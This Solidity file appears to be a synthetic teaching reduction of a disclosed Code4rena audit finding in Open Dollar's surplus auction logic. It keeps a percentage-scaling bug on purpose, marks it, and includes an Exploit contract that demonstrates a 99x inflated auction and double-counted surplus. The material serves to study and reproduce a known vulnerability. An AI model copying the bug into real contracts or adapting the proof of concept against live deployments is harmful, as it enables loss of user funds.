// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Open Dollar — [H-01] Incorrect calculations for Surplus Auction creation
    cause massive surplus imbalances (Code4rena 2023-10-opendollar, #29347,
    reporter tnquanghuy0512).

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.

    Root cause: AccountingEngine.auctionSurplus() uses ONE_HUNDRED_WAD (100e18)
    instead of WAD (1e18) in two places:

      1. if (_params.surplusTransferPercentage < ONE_HUNDRED_WAD)  // always true
      2. _amountToSell: surplusAmount.wmul(ONE_HUNDRED_WAD - pct) // 99× inflated

    With surplusTransferPercentage = 1e18 (100%), a ghost auction is still
    created for ~99× surplusAmount, AND the full surplusAmount is also
    transferred to extraSurplusReceiver — double-counting / accounting break.
//////////////////////////////////////////////////////////////////////////*/

uint256 constant WAD = 1e18;
uint256 constant ONE_HUNDRED_WAD = 100e18;

library Wmul {
    function wmul(uint256 x, uint256 y) internal pure returns (uint256) {
        return (x * y) / WAD;
    }
}

contract SafeEngine {
    mapping(address => uint256) public coinBalance;
    mapping(address => uint256) public debtBalance;

    function mintCoin(address to, uint256 rad) external {
        coinBalance[to] += rad;
    }

    function transferInternalCoins(address source, address destination, uint256 rad) external {
        coinBalance[source] -= rad;
        coinBalance[destination] += rad;
    }

    function settleDebt(uint256 rad) external {
        coinBalance[msg.sender] -= rad;
        debtBalance[msg.sender] -= rad;
    }
}

/// @dev Records the inflated amountToSell the auction house is asked to sell.
contract SurplusAuctionHouse {
    uint256 public lastAmountToSell;
    uint256 public auctionCount;

    function startAuction(uint256 _amountToSell, uint256 /*_initialBid*/) external returns (uint256 id) {
        lastAmountToSell = _amountToSell;
        auctionCount += 1;
        id = auctionCount;
    }
}

/// @notice Reduced AccountingEngine.auctionSurplus — ONE_HUNDRED_WAD bugs verbatim.
contract AccountingEngine {
    using Wmul for uint256;

    error AccEng_surplusTransferPercentOverLimit();
    error AccEng_NullAmount();
    error AccEng_NullSurplusReceiver();
    error AccEng_InsufficientSurplus();

    SafeEngine public safeEngine;
    SurplusAuctionHouse public surplusAuctionHouse;
    address public extraSurplusReceiver;

    uint256 public surplusAmount;
    uint256 public surplusBuffer;
    uint256 public surplusTransferPercentage; // WAD-scaled (1e18 = 100%)

    uint256 public lastSurplusTime;
    uint256 public lastAuctionAmountToSell;
    uint256 public lastTransferAmount;

    constructor(
        SafeEngine _safeEngine,
        SurplusAuctionHouse _house,
        address _extraReceiver,
        uint256 _surplusAmount,
        uint256 _surplusBuffer,
        uint256 _pct
    ) {
        safeEngine = _safeEngine;
        surplusAuctionHouse = _house;
        extraSurplusReceiver = _extraReceiver;
        surplusAmount = _surplusAmount;
        surplusBuffer = _surplusBuffer;
        surplusTransferPercentage = _pct;
    }

    function _settleDebt(uint256 _coinBalance, uint256 _debtBalance, uint256 /*_unqueued*/)
        internal
        returns (uint256, uint256)
    {
        // no debt in this reduction
        return (_coinBalance, _debtBalance);
    }

    function _unqueuedUnauctionedDebt(uint256) internal pure returns (uint256) {
        return 0;
    }

    /// @notice Verbatim-shape auctionSurplus with the two ONE_HUNDRED_WAD bugs.
    function auctionSurplus() external returns (uint256 _id) {
        if (surplusTransferPercentage > WAD) revert AccEng_surplusTransferPercentOverLimit();
        if (surplusAmount == 0) revert AccEng_NullAmount();
        if (extraSurplusReceiver == address(0)) revert AccEng_NullSurplusReceiver();

        uint256 _coinBalance = safeEngine.coinBalance(address(this));
        uint256 _debtBalance = safeEngine.debtBalance(address(this));
        (_coinBalance, _debtBalance) = _settleDebt(_coinBalance, _debtBalance, _unqueuedUnauctionedDebt(_debtBalance));

        if (_coinBalance < _debtBalance + surplusAmount + surplusBuffer) {
            revert AccEng_InsufficientSurplus();
        }

        // auction surplus percentage
        // FIX: if (surplusTransferPercentage < WAD)
        if (surplusTransferPercentage < ONE_HUNDRED_WAD) { // @> VULN: ONE_HUNDRED_WAD always true for valid pct
            // FIX: surplusAmount.wmul(WAD - surplusTransferPercentage)
            _id = surplusAuctionHouse.startAuction(
                surplusAmount.wmul(ONE_HUNDRED_WAD - surplusTransferPercentage), // @> VULN: 99x inflate
                0
            );
            lastAuctionAmountToSell = surplusAmount.wmul(ONE_HUNDRED_WAD - surplusTransferPercentage);
            lastSurplusTime = block.timestamp;
        }

        // transfer surplus percentage
        if (surplusTransferPercentage > 0) {
            if (extraSurplusReceiver == address(0)) revert AccEng_NullSurplusReceiver();

            uint256 transferAmt = surplusAmount.wmul(surplusTransferPercentage);
            safeEngine.transferInternalCoins({
                source: address(this),
                destination: extraSurplusReceiver,
                rad: transferAmt
            });
            lastTransferAmount = transferAmt;
            lastSurplusTime = block.timestamp;
        }
    }
}

/// @notice Demonstrates 100% transfer still creates a 99× inflated ghost auction
///         AND transfers the full surplusAmount — double-counting.
contract Exploit {
    uint256 public constant SURPLUS_AMOUNT = 3e18;
    uint256 public constant PCT_100 = 1e18; // 100%

    SafeEngine public safeEngine; // 1
    SurplusAuctionHouse public house; // 2
    AccountingEngine public accountingEngine; // 3
    address public extraReceiver; // abstract EOA

    constructor() {
        extraReceiver = address(0xE11A);
        safeEngine = new SafeEngine(); // 1
        house = new SurplusAuctionHouse(); // 2
        accountingEngine = new AccountingEngine(
            safeEngine,
            house,
            extraReceiver,
            SURPLUS_AMOUNT,
            0, // buffer
            PCT_100
        ); // 3

        // Seed enough surplus coin: surplusAmount + buffer
        safeEngine.mintCoin(address(accountingEngine), SURPLUS_AMOUNT);
    }

    function run() external {
        // At 100%, fixed code must NOT create an auction (amountToSell = 0)
        // and only transfer surplusAmount. Buggy code creates auction of 297e18
        // AND transfers 3e18.
        accountingEngine.auctionSurplus();

        uint256 amountToSell = house.lastAmountToSell();
        // PoC math from the finding:
        // _amountToSell = 3e18 * (100e18 - 1e18) / 1e18 = 297e18
        require(amountToSell == 297e18, "inflated amountToSell not demonstrated");
        require(house.auctionCount() == 1, "ghost auction not created");
        require(accountingEngine.lastTransferAmount() == SURPLUS_AMOUNT, "full transfer missing");
        require(safeEngine.coinBalance(extraReceiver) == SURPLUS_AMOUNT, "receiver did not get surplus");
        // Double-count surface: auction claims 297 while only 3 existed + 3 transferred
        require(amountToSell > SURPLUS_AMOUNT * 50, "not massively inflated");
    }
}
